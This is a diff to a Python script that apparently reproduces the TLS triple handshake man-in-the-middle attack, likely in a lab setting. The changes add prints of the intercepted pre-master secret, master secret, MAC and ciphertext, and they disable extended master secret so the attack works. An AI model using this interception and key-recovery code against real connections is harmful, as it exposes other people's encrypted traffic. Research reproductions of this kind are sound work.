@@ -407,6 +407,7 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
                     print("Plaintext pre master key should be 48 bytes long, 2 for the version, 46 for the random number")
                     print("length: " + str(len(pre_master_key)))
                     print("plaintext: " + str(pre_master_key))
+                    print("plaintext (HEX): " + pre_master_key.hex())
 
                     #reencrypt with the server's public key and send it like that...
                     with open("/app/server_certificate.pem", "rb") as pub_cert_file_server:
@@ -472,10 +473,11 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
             #let's calculate the secret and keying material!
             computed_master_key = tls_1_1_prf.compute_master_secret(pre_master_key, client_random, server_random)
             print(f"MASTER SECRET (len:{len(computed_master_key)}): " + str(computed_master_key))
+            print(f"Master secret (hex): {computed_master_key.hex()}")
 
             # AES_256_CBC_SHA needs 2x32 bytes keys, 2x20 byte mac secrets and 2x16 byte initialization vectors,
             # for a total of 136 bytes of material (RFC 4346 sec. 6.3)
-            key_block = _tls_PRF(computed_master_key, "key expansion".encode(), server_random + client_random, 136)
+            key_block = _tls_PRF(computed_master_key, b'key expansion', server_random + client_random, 136)
             client_write_MAC_secret = key_block[0:20]
             server_write_MAC_secret = key_block[20:40]
             client_write_key = key_block[40:72]
@@ -518,6 +520,7 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
             h = hmac.HMAC(client_write_MAC_secret, hashes.SHA1())
             h.update(intermediary_plaintext)
             signature = h.finalize() # MAC[CipherSpec.hash_size] = MAC[20 BYTES]
+            print(b"Signature: " + signature)
 
             # RECIPE FOR GenericBlockCipher
             # IV [16 bytes]
@@ -538,12 +541,13 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
 
             plaintext += padding
 
+            print(b"plaintext: " + plaintext)
             print("padded plaintext length: " + str(len(plaintext)))
 
             ct = encryptor.update(plaintext) + encryptor.finalize()
 
 
-            print(f"Ciphertext: {ct}")
+            print(b"Ciphertext: " + ct)
             print("Ciphertext length: " + str(len(ct)))
 
             generic_tls_layer.msg = ct
@@ -623,7 +627,8 @@ if __name__ == '__main__':
         settings.maxVersion = TLS_VERSION
         settings.keyExchangeNames = ["rsa", "dhe_rsa"]
         settings.useEncryptThenMAC = False
-
+        settings.useExtendedMasterSecret = False # VERYYYYYY IMPORTANT!!!!!!!!!!!!!!!!!!!!! The triple handshake attack doesn't work if this is ON!!!
+                                                 #section 4 RFC 7627
         try:
             conn.handshakeClientCert(chain,
                                      private_key,
@@ -681,6 +686,8 @@ if __name__ == '__main__':
         settings.cipherNames=["aes256gcm", "aes256"]
         settings.keyExchangeNames = ["rsa", "dhe_rsa"]
         settings.useEncryptThenMAC = False
+        settings.useExtendedMasterSecret = False  # VERYYYYYY IMPORTANT!!!!!!!!!!!!!!!!!!!!! The triple handshake attack doesn't work if this is ON!!!
+                                                  # section 4 RFC 7627
         # session cache active, so we can resume laster
         sessionCache = SessionCache()
 
